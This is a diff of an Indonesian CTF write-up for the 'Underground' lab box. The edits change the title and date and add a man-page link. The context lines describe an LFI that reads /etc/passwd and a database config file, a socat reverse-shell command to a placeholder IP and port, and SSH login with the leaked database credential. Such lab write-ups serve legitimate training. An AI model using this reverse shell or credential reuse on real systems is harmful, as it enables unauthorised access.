@@ -1,6 +1,6 @@
 ---
-title: "{SHL} Challenge Underground Write Up"
-date: 2020-05-21T00:25:20+07:00
+title: "{SHL} Challenge Writeup - Underground "
+date: 2020-06-21T00:25:20+07:00
 tags: [ "Challenge", "SHL"]
 draft: true
 ---
@@ -8,14 +8,14 @@ draft: true
 ## About Challenge
 ![](/images/shl/underground/intro.png)
 
-Machine : Underground b0x
-Level   : ez to medium
-Goal    : root user and read the root.txt
-
+    Machine : Underground b0x
+    Level   : ez to medium
+    Goal    : root user and read the root.txt
 
 
 ## Reconnaissance & Scanning
 Pertama kita akan memulainya dengan melakukan scanning terhadap target menggunakan nmap, dari hasil scanning kita mendapatkan informasi berupa port ataupun service yang berjalan dan dapat diakses dari external network. 
+
 
 ![](/images/shl/underground/1.png)
 
@@ -105,7 +105,7 @@ Command : socat tcp-connect:IP Address:Port system:/bin/sh
 
 ![](/images/shl/underground/17.png)
 
-Melihat shell yang digunakan sekarang menunjukkan bahwa kita sedang menggunakan shell nologin yang artinya dia bisa menjalankan shell, tapi tidak dianggap sevagai user login [man nologin]. Kenapa ngga sadar dari tadi pas load /etc/passwd saat percobaan LFI yak? Monmap namanya juga khilaf… rasanya ada yang kurang lengkap jika tidak melakukan backconnect haha...
+Melihat shell yang digunakan sekarang menunjukkan bahwa kita sedang menggunakan shell nologin yang artinya dia bisa menjalankan shell, tapi tidak dianggap sevagai user login [man nologin](https://man7.org/linux/man-pages/man8/nologin.8.html). Kenapa ngga sadar dari tadi pas load /etc/passwd saat percobaan LFI yak? Monmap namanya juga khilaf… rasanya ada yang kurang lengkap jika tidak melakukan backconnect haha...
 
 ### Gaining Access Through Database Credential
 Melihat proses yang sedang berjalan, menunjukkan bahwa terdapat user human. Wait? Seperti tidak asing, pada celah LFI tadi sempat melihat credential database dengan user human, kenapa tidak coba login ssh menggunakan credential ini saja? Siapa tau beruntung yak an? Untuk memastikan coba kita check sekali lagi file koneksi.php nya
